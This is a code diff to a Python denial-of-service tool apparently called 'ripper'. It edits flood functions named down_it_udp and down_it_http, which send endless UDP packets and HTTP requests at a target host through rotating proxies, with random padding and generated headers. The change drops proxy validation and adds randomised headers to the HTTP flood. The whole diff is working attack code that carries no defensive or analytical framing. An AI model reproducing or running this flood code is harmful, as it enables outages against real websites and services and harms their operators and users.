@@ -2,31 +2,24 @@ import socket
 from os import urandom as randbytes
 from socks import ProxyError
 
-import ripper.services
+import ripper.services as services
 from ripper.constants import *
 from ripper.context import Context, Errors, ErrorCodes
 from ripper.common import get_random_string
-from ripper.proxy import Sock5Proxy
 from ripper.urllib_x import build_request_http_package, http_request
 
 ###############################################
 # Common methods for attacks
 ###############################################
 # TODO add support for http_method, http_path
-def build_ctx_request_http_package(_ctx: Context, is_accept_header_only: bool = True) -> str:
-    local_headers = _ctx.headers
-    if is_accept_header_only:
-        local_headers = {
-            'Accept': _ctx.headers['Accept']
-        }
-
+def build_ctx_request_http_package(_ctx: Context) -> str:
     extra_data = ''
     if _ctx.max_random_packet_len > 0:
         extra_data = get_random_string(1, _ctx.max_random_packet_len)
 
     return build_request_http_package(
         host=_ctx.host,
-        headers=local_headers,
+        headers=services.generate_headers(_ctx),
         extra_data=extra_data,
     )
 
@@ -38,13 +31,7 @@ def down_it_udp(_ctx: Context) -> None:
     i = 1
     proxy = None
     while True:
-        if proxy is None:
-            proxy = _ctx.proxy_manager.get_random_proxy()
-            if proxy and not proxy.validate():
-                _ctx.proxy_manager.delete_proxy_sync(proxy)
-                proxy = None
-                continue
-
+        proxy = _ctx.proxy_manager.get_random_proxy()
         sock = _ctx.sock_manager.get_udp_socket(proxy)
         request_packet = build_ctx_request_http_package(_ctx)
 
@@ -69,10 +56,10 @@ def down_it_udp(_ctx: Context) -> None:
             if not _ctx.Statistic.connect.in_progress:
                 threading.Thread(
                     daemon=True,
-                    target=ripper.services.connect_host,
+                    target=services.connect_host,
                     args=[_ctx, proxy],
                 ).start()
-                # ripper.services.connect_host(_ctx,)
+                # services.connect_host(_ctx,)
 
 
 def down_it_http(_ctx: Context) -> None:
@@ -86,6 +73,7 @@ def down_it_http(_ctx: Context) -> None:
                 proxy=proxy,
                 http_method=_ctx.http_method,
                 socket_timeout=_ctx.sock_manager.socket_timeout,
+                headers=services.generate_headers(_ctx),
             )
         except ProxyError:
             _ctx.proxy_manager.delete_proxy_sync(proxy)
